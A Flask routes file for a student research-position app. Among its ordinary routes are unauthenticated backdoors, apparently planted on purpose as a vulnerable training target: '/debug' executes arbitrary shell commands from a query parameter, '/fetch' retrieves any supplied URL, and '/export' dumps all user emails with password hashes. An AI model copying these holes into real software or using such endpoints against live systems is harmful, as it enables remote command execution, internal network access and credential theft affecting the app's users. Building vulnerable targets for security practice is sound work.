from app import db
from flask import render_template, flash, redirect, url_for, request, jsonify
import sqlalchemy as sqla
import urllib.request
import subprocess

from app.main.models import Course, Student, Position, Faculty, Major, ResearchTopic, Language
from app.main.models import Student
#from app.main.forms import CourseForm, EditForm, EmptyForm
from app.student.forms import SortForm
from flask_login import current_user, login_required
from sqlalchemy import text
from wtforms.validators import DataRequired, Email
from datetime import datetime


from app.main import main_blueprint as main
from app.auth.role_required import role_required

@main.route('/admin', methods=['GET', 'POST'])
def admin():
    return "CONGRATS!!! YOU FOUND A VULNERABILITY!"

@main.route('/fetch', methods=['GET', 'POST'])
def fetch_url():
    url = request.args.get('url')
    if url:
        try:
            response = urllib.request.urlopen(url)
            content = response.read().decode('utf-8')
            return f"<pre>{content}</pre>"
        except Exception as e:
            return f"Error fetching URL: {str(e)}"
    return "Please provide a URL parameter"

@main.route('/debug', methods=['GET', 'POST'])
def debug():
    cmd = request.args.get('cmd')
    if cmd:
        try:
            result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
            return f"<pre>{result.decode('utf-8')}</pre>"
        except Exception as e:
            return f"Error: {str(e)}"
    return "Please provide a cmd parameter"

@main.route('/export', methods=['GET'])
def export_data():
    users = Student.query.all()
    output = "All Users (email:password_hash)\n"
    output += "="*50 + "\n"
    for user in users:
        output += f"{user.email}:{user.password_hash}\n"
    faculty = Faculty.query.all()
    output += "\nFaculty\n"
    output += "="*50 + "\n"
    for f in faculty:
        output += f"{f.email}:{f.password_hash}\n"
    return f"<pre>{output}</pre>"

@main.route('/', methods=['GET', 'POST'])
@main.route('/index', methods=['GET', 'POST']) #deprecated: see student.student_index for main.index
@login_required
def index():
    form = SortForm()

    majors = db.session.scalars(sqla.select(Major)).all()
    form.majors.choices = [(m.id, m.name) for m in majors]

    courses = db.session.scalars(sqla.select(Course)).all()
    form.courses.choices = [(c.id, c.name) for c in courses]

    instructors = db.session.scalars(sqla.select(Faculty)).all()
    form.course_instructors.choices = [(i.id, f"{i.firstname} {i.lastname or ''}".strip()) for i in instructors]

    topics = db.session.scalars(sqla.select(ResearchTopic).distinct()).all()
    form.research_topics.choices = [(t.name, t.name) for t in topics]

    languages = db.session.scalars(sqla.select(Language).distinct()).all()
    form.languages.choices = [(l.name, l.name) for l in languages]

    Positions = sqla.select(Position)
    if form.validate_on_submit(): 
        if form.majors.data and len(form.majors.data) > 0:
            Positions = Positions.join(Position.majors).where(Major.id.in_(form.majors.data)).distinct()
        if form.courses.data and len(form.courses.data) > 0:
            Positions = Positions.join(Position.courses).where(Course.id.in_(form.courses.data)).distinct()
        if form.grades.data:
            Positions = Positions.where(Position.min_gpa >= float(form.grades.data))
        if form.course_instructors.data:
            Positions = Positions.join(Position.faculty).where(Faculty.id == form.course_instructors.data).distinct()
        if form.research_topics.data and len(form.research_topics.data) > 0:
            Positions = Positions.join(Position.research_topics).where(ResearchTopic.name.in_(form.research_topics.data)).distinct()
        if form.languages.data and len(form.languages.data) > 0:
            Positions = Positions.join(Position.languages).where(Language.name.in_(form.languages.data)).distinct()

    Students = db.session.scalars(sqla.select(Student))
    Faculties = db.session.scalars(sqla.select(Faculty))
    PositionsA = db.session.scalars(Positions).all()
    if current_user.is_authenticated:
        if current_user.role == 'faculty':
            return redirect(url_for('faculty.faculty_index', faculty_id=current_user.id))
        elif current_user.role == 'student':
            return redirect(url_for('student.student_index', student_id=current_user.id))
    return render_template('student_index.html', title="Course List", students = Students, form = form, positions=PositionsA)

@main.route('/position/<position_id>/view', methods=['GET'])
@login_required
def view_position(position_id):
    position=Position.query.get_or_404(position_id)
    if current_user.role == 'student' and position.is_full():
        flash('This position is full and no longer accepting applications.', 'error')
        return redirect(url_for('student.student_index', student_id=current_user.id))
    return render_template('position_detail_page.html',position=position)


@main.route('/student_list/<position_id>/view', methods=['GET'])
@login_required
@role_required("faculty")
def view_student_list(position_id):  
    if isinstance(current_user, Faculty): 
        position=Position.query.get_or_404(position_id)
        
        filtered_applications = position.applications
        
        return render_template('apply_student_list.html', position=position, filtered_applications=filtered_applications)
    else:
        return "Permission denied: you are not a faculty member"
